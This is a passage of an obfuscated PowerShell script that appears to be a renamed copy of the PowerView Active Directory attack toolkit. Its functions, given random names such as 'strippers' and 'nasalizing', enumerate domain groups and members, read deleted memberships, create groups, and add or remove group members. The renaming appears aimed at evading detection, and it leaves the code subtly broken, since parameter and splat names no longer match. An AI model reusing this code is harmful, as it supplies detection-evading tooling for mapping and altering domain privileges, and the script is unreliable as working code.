                if ($PSBoundParameters['GroupScope']) {
                    $viPEgomk99 = $PSBoundParameters['GroupScope']
                    $kXbEpVCq99 = Switch ($viPEgomk99) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[burlap] Searching for group scope '$viPEgomk99'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $aDrSmUHb99 = $PSBoundParameters['GroupProperty']
                    $kXbEpVCq99 = Switch ($aDrSmUHb99) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[burlap] Searching for group property '$aDrSmUHb99'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[burlap] Using additional LDAP filter: $HOOTOEqu99"
                    $kXbEpVCq99 += "$HOOTOEqu99"
                }
                $vLzWmKPH99.filter = "(&(objectCategory=group)$kXbEpVCq99)"
                Write-Verbose "[burlap] filter string: $($vLzWmKPH99.filter)"
                if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $vLzWmKPH99.FindOne() }
                else { $pfqXXMQd99 = $vLzWmKPH99.FindAll() }
                $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $Group = $_
                    }
                    else {
                        $Group = Buddy -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($pfqXXMQd99) {
                    try { $pfqXXMQd99.dispose() }
                    catch {
                        Write-Verbose "[burlap] Error disposing of the Results object"
                    }
                }
                $vLzWmKPH99.dispose()
            }
        }
    }
}
function incorruptible {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $xjbZUAHW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $LyNjMZjk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $zdmbPkzH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    $cqurrley99 = @{
        'Identity' = $xjbZUAHW99
    }
    if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
    if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
    $JBFcwhcg99 = Piedmont @ContextArguments
    if ($JBFcwhcg99) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($JBFcwhcg99.Context)
        $Group.SamAccountName = $JBFcwhcg99.Identity
        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $JBFcwhcg99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $LyNjMZjk99
        }
        else {
            $Group.DisplayName = $JBFcwhcg99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $Group.Description = $zdmbPkzH99
        }
        Write-Verbose "[incorruptible] Attempting to create group '$xjbZUAHW99'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[incorruptible] Group '$xjbZUAHW99' successfully created"
            $Group
        }
        catch {
            Write-Warning "[incorruptible] Error creating group '$xjbZUAHW99' : $_"
        }
    }
}
function flick {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $PPosolen99['Domain'] = $SSNUOPgW99
            $IayDthuO99 = $SSNUOPgW99
        }
        else {
            $IayDthuO99 = $Env:USERDNSDOMAIN
        }
        burlap @SearcherArguments | ForEach-Object {
            $PPosolen99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $PPosolen99['Identity'] = $_.managedBy
            $Null = $PPosolen99.Remove('LDAPFilter')
            $pNmdNGtD99 = farrowing @SearcherArguments
            $rMVNeNaH99 = New-Object PSObject
            $rMVNeNaH99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $rMVNeNaH99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $rMVNeNaH99 | Add-Member Noteproperty 'ManagerName' $pNmdNGtD99.samaccountname
            $rMVNeNaH99 | Add-Member Noteproperty 'ManagerDistinguishedName' $pNmdNGtD99.distinguishedName
            if ($pNmdNGtD99.samaccounttype -eq 0x10000000) {
                $rMVNeNaH99 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($pNmdNGtD99.samaccounttype -eq 0x30000000) {
                $rMVNeNaH99 | Add-Member Noteproperty 'ManagerType' 'User'
            }
            $WGnEEzJx99 = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $WGnEEzJx99['Server'] = $mSxqoOjK99 }
            if ($PSBoundParameters['SearchScope']) { $WGnEEzJx99['SearchScope'] = $vaSWXjPs99 }
            if ($PSBoundParameters['ResultPageSize']) { $WGnEEzJx99['ResultPageSize'] = $mhcqrrQn99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $WGnEEzJx99['ServerTimeLimit'] = $mvTbAWDU99 }
            if ($PSBoundParameters['Tombstone']) { $WGnEEzJx99['Tombstone'] = $rPozaKft99 }
            if ($PSBoundParameters['Credential']) { $WGnEEzJx99['Credential'] = $gxazvivN99 }
            $rMVNeNaH99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
            $rMVNeNaH99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $rMVNeNaH99
        }
    }
}
function strippers {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $rgwwJWhX99,
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $PZlvJJwL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PPosolen99 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $GnxtbMaP99 = @{}
        if ($PSBoundParameters['Domain']) { $GnxtbMaP99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Server']) { $GnxtbMaP99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['Credential']) { $GnxtbMaP99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        $vLzWmKPH99 = watersides @SearcherArguments
        if ($vLzWmKPH99) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $PPosolen99['Identity'] = $BfpbWwpi99
                $PPosolen99['Raw'] = $True
                $Group = burlap @SearcherArguments
                if (-not $Group) {
                    Write-Warning "[strippers] Error searching for group with identity: $BfpbWwpi99"
                }
                else {
                    $PqNFtuNd99 = $Group.properties.item('samaccountname')[0]
                    $QauRgHVJ99 = $Group.properties.item('distinguishedname')[0]
                    if ($PSBoundParameters['Domain']) {
                        $xGMUYkFb99 = $SSNUOPgW99
                    }
                    else {
                        if ($QauRgHVJ99) {
                            $xGMUYkFb99 = $QauRgHVJ99.SubString($QauRgHVJ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[strippers] Using LDAP matching rule to recurse on '$QauRgHVJ99', only user accounts will be returned."
                    $vLzWmKPH99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$QauRgHVJ99))"
                    $vLzWmKPH99.PropertiesToLoad.AddRange(('distinguishedName'))
                    $SvCMbRzc99 = $vLzWmKPH99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $PPosolen99.Remove('Raw')
            }
            else {
                $afFJXkRc99 = ''
                $kXbEpVCq99 = ''
                $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                    $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($QghnbJOP99 -match '^S-1-') {
                        $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
                    }
                    elseif ($QghnbJOP99 -match '^CN=') {
                        $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[strippers] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                            $PPosolen99['Domain'] = $BvhyhWZG99
                            $vLzWmKPH99 = watersides @SearcherArguments
                            if (-not $vLzWmKPH99) {
                                Write-Warning "[strippers] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                            }
                        }
                    }
                    elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                    }
                    elseif ($QghnbJOP99.Contains('\')) {
                        $TzefbTEv99 = $QghnbJOP99.Replace('\28', '(').Replace('\29', ')') | kinsman -OutputType Canonical
                        if ($TzefbTEv99) {
                            $BBaSdAsr99 = $TzefbTEv99.SubString(0, $TzefbTEv99.IndexOf('/'))
                            $SZjbzmKX99 = $QghnbJOP99.Split('\')[1]
                            $afFJXkRc99 += "(samAccountName=$SZjbzmKX99)"
                            $PPosolen99['Domain'] = $BBaSdAsr99
                            Write-Verbose "[strippers] Extracted domain '$BBaSdAsr99' from '$QghnbJOP99'"
                            $vLzWmKPH99 = watersides @SearcherArguments
                        }
                    }
                    else {
                        $afFJXkRc99 += "(samAccountName=$QghnbJOP99)"
                    }
                }
                if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                    $kXbEpVCq99 += "(|$afFJXkRc99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[strippers] Using additional LDAP filter: $HOOTOEqu99"
                    $kXbEpVCq99 += "$HOOTOEqu99"
                }
                $vLzWmKPH99.filter = "(&(objectCategory=group)$kXbEpVCq99)"
                Write-Verbose "[strippers] strippers filter string: $($vLzWmKPH99.filter)"
                try {
                    $fYOedlSN99 = $vLzWmKPH99.FindOne()
                }
                catch {
                    Write-Warning "[strippers] Error searching for group with identity '$BfpbWwpi99': $_"
                    $SvCMbRzc99 = @()
                }
                $PqNFtuNd99 = ''
                $QauRgHVJ99 = ''
                if ($fYOedlSN99) {
                    $SvCMbRzc99 = $fYOedlSN99.properties.item('member')
                    if ($SvCMbRzc99.count -eq 0) {
                        $PZoQITAp99 = $False
                        $RGjCxdNt99 = 0
                        $Top = 0
                        while (-not $PZoQITAp99) {
                            $Top = $RGjCxdNt99 + 1499
                            $SxXLgDDL99="member;range=$RGjCxdNt99-$Top"
                            $RGjCxdNt99 += 1500
                            $Null = $vLzWmKPH99.PropertiesToLoad.Clear()
                            $Null = $vLzWmKPH99.PropertiesToLoad.Add("$SxXLgDDL99")
                            $Null = $vLzWmKPH99.PropertiesToLoad.Add('samaccountname')
                            $Null = $vLzWmKPH99.PropertiesToLoad.Add('distinguishedname')
                            try {
                                $fYOedlSN99 = $vLzWmKPH99.FindOne()
                                $EWpIwsOz99 = $fYOedlSN99.Properties.PropertyNames -like "member;range=*"
                                $SvCMbRzc99 += $fYOedlSN99.Properties.item($EWpIwsOz99)
                                $PqNFtuNd99 = $fYOedlSN99.properties.item('samaccountname')[0]
                                $QauRgHVJ99 = $fYOedlSN99.properties.item('distinguishedname')[0]
                                if ($SvCMbRzc99.count -eq 0) {
                                    $PZoQITAp99 = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $PZoQITAp99 = $True
                            }
                        }
                    }
                    else {
                        $PqNFtuNd99 = $fYOedlSN99.properties.item('samaccountname')[0]
                        $QauRgHVJ99 = $fYOedlSN99.properties.item('distinguishedname')[0]
                        $SvCMbRzc99 += $fYOedlSN99.Properties.item($EWpIwsOz99)
                    }
                    if ($PSBoundParameters['Domain']) {
                        $xGMUYkFb99 = $SSNUOPgW99
                    }
                    else {
                        if ($QauRgHVJ99) {
                            $xGMUYkFb99 = $QauRgHVJ99.SubString($QauRgHVJ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }
            ForEach ($cgTuSBdj99 in $SvCMbRzc99) {
                if ($rgwwJWhX99 -and $mOHAixgN99) {
                    $SdzJuWMG99 = $_.Properties
                }
                else {
                    $VmkJyBhe99 = $PPosolen99.Clone()
                    $VmkJyBhe99['Identity'] = $cgTuSBdj99
                    $VmkJyBhe99['Raw'] = $True
                    $VmkJyBhe99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = farrowing @ObjectSearcherArguments
                    $SdzJuWMG99 = $Object.Properties
                }
                if ($SdzJuWMG99) {
                    $lzrMeMHC99 = New-Object PSObject
                    $lzrMeMHC99 | Add-Member Noteproperty 'GroupDomain' $xGMUYkFb99
                    $lzrMeMHC99 | Add-Member Noteproperty 'GroupName' $PqNFtuNd99
                    $lzrMeMHC99 | Add-Member Noteproperty 'GroupDistinguishedName' $QauRgHVJ99
                    if ($SdzJuWMG99.objectsid) {
                        $TBSJNJUH99 = ((New-Object System.Security.Principal.SecurityIdentifier $SdzJuWMG99.objectsid[0], 0).Value)
                    }
                    else {
                        $TBSJNJUH99 = $Null
                    }
                    try {
                        $aZTLxyBR99 = $SdzJuWMG99.distinguishedname[0]
                        if ($aZTLxyBR99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $TBSJNJUH99) {
                                    $TBSJNJUH99 = $SdzJuWMG99.cn[0]
                                }
                                $pUYOYoCO99 = kinsman -Identity $TBSJNJUH99 -OutputType 'DomainSimple' @ADNameArguments
                                if ($pUYOYoCO99) {
                                    $uuoLoDkc99 = $pUYOYoCO99.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[strippers] Error converting $aZTLxyBR99"
                                    $uuoLoDkc99 = $Null
                                }
                            }
                            catch {
                                Write-Warning "[strippers] Error converting $aZTLxyBR99"
                                $uuoLoDkc99 = $Null
                            }
                        }
                        else {
                            $uuoLoDkc99 = $aZTLxyBR99.SubString($aZTLxyBR99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $aZTLxyBR99 = $Null
                        $uuoLoDkc99 = $Null
                    }
                    if ($SdzJuWMG99.samaccountname) {
                        $jKgysTLK99 = $SdzJuWMG99.samaccountname[0]
                    }
                    else {
                        try {
                            $jKgysTLK99 = woodmen -ObjectSID $SdzJuWMG99.cn[0] @ADNameArguments
                        }
                        catch {
                            $jKgysTLK99 = $SdzJuWMG99.cn[0]
                        }
                    }
                    if ($SdzJuWMG99.objectclass -match 'computer') {
                        $crRUCcfe99 = 'computer'
                    }
                    elseif ($SdzJuWMG99.objectclass -match 'group') {
                        $crRUCcfe99 = 'group'
                    }
                    elseif ($SdzJuWMG99.objectclass -match 'user') {
                        $crRUCcfe99 = 'user'
                    }
                    else {
                        $crRUCcfe99 = $Null
                    }
                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberDomain' $uuoLoDkc99
                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberName' $jKgysTLK99
                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberDistinguishedName' $aZTLxyBR99
                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberObjectClass' $crRUCcfe99
                    $lzrMeMHC99 | Add-Member Noteproperty 'MemberSID' $TBSJNJUH99
                    $lzrMeMHC99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $lzrMeMHC99
                    if ($PSBoundParameters['Recurse'] -and $aZTLxyBR99 -and ($crRUCcfe99 -match 'group')) {
                        Write-Verbose "[strippers] Manually recursing on group: $aZTLxyBR99"
                        $PPosolen99['Identity'] = $aZTLxyBR99
                        $Null = $PPosolen99.Remove('Properties')
                        strippers @SearcherArguments
                    }
                }
            }
            $vLzWmKPH99.dispose()
        }
    }
}
function predominantly {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $PPosolen99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $PPosolen99['Identity'] = $BfpbWwpi99 }
        farrowing @SearcherArguments | ForEach-Object {
            $HxrwipaH99 = $_.Properties['distinguishedname'][0]
            ForEach($gsLTSbEi99 in $_.Properties['msds-replvaluemetadata']) {
                $pczMbpLs99 = [xml]$gsLTSbEi99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($pczMbpLs99) {
                    if (($pczMbpLs99.pszAttributeName -Match 'member') -and (($pczMbpLs99.dwVersion % 2) -eq 0 )) {
                        $ERfozkEO99 = New-Object PSObject
                        $ERfozkEO99 | Add-Member NoteProperty 'GroupDN' $HxrwipaH99
                        $ERfozkEO99 | Add-Member NoteProperty 'MemberDN' $pczMbpLs99.pszObjectDn
                        $ERfozkEO99 | Add-Member NoteProperty 'TimeFirstAdded' $pczMbpLs99.ftimeCreated
                        $ERfozkEO99 | Add-Member NoteProperty 'TimeDeleted' $pczMbpLs99.ftimeDeleted
                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingChange' $pczMbpLs99.ftimeLastOriginatingChange
                        $ERfozkEO99 | Add-Member NoteProperty 'TimesAdded' ($pczMbpLs99.dwVersion / 2)
                        $ERfozkEO99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $pczMbpLs99.pszLastOriginatingDsaDN
                        $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $ERfozkEO99
                    }
                }
                else {
                    Write-Verbose "[predominantly] Error retrieving 'msds-replvaluemetadata' for '$HxrwipaH99'"
                }
            }
        }
    }
}
function nasalizing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $BfpbWwpi99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $SvCMbRzc99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cqurrley99 = @{
            'Identity' = $BfpbWwpi99
        }
        if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
        $blCNDyjh99 = Piedmont @ContextArguments
        if ($blCNDyjh99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($blCNDyjh99.Context, $blCNDyjh99.Identity)
            }
            catch {
                Write-Warning "[nasalizing] Error finding the group identity '$BfpbWwpi99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($cgTuSBdj99 in $SvCMbRzc99) {
                if ($cgTuSBdj99 -match '.+\\.+') {
                    $cqurrley99['Identity'] = $cgTuSBdj99
                    $FqkHMcxT99 = Piedmont @ContextArguments
                    if ($FqkHMcxT99) {
                        $rqcypngr99 = $FqkHMcxT99.Identity
                    }
                }
                else {
                    $FqkHMcxT99 = $blCNDyjh99
                    $rqcypngr99 = $cgTuSBdj99
                }
                Write-Verbose "[nasalizing] Adding member '$cgTuSBdj99' to group '$BfpbWwpi99'"
                $cgTuSBdj99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($FqkHMcxT99.Context, $rqcypngr99)
                $Group.Members.Add($cgTuSBdj99)
                $Group.Save()
            }
        }
    }
}
function cafeteria {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $BfpbWwpi99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $SvCMbRzc99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cqurrley99 = @{
            'Identity' = $BfpbWwpi99
        }
        if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
        $blCNDyjh99 = Piedmont @ContextArguments
        if ($blCNDyjh99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($blCNDyjh99.Context, $blCNDyjh99.Identity)
            }
            catch {
                Write-Warning "[cafeteria] Error finding the group identity '$BfpbWwpi99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($cgTuSBdj99 in $SvCMbRzc99) {
                if ($cgTuSBdj99 -match '.+\\.+') {
                    $cqurrley99['Identity'] = $cgTuSBdj99
                    $FqkHMcxT99 = Piedmont @ContextArguments
                    if ($FqkHMcxT99) {
                        $rqcypngr99 = $FqkHMcxT99.Identity
                    }
                }
                else {
                    $FqkHMcxT99 = $blCNDyjh99
                    $rqcypngr99 = $cgTuSBdj99
                }
                Write-Verbose "[cafeteria] Removing member '$cgTuSBdj99' from group '$BfpbWwpi99'"
                $cgTuSBdj99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($FqkHMcxT99.Context, $rqcypngr99)
                $Group.Members.Remove($cgTuSBdj99)
                $Group.Save()
            }
        }
    }
}
function furloughing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
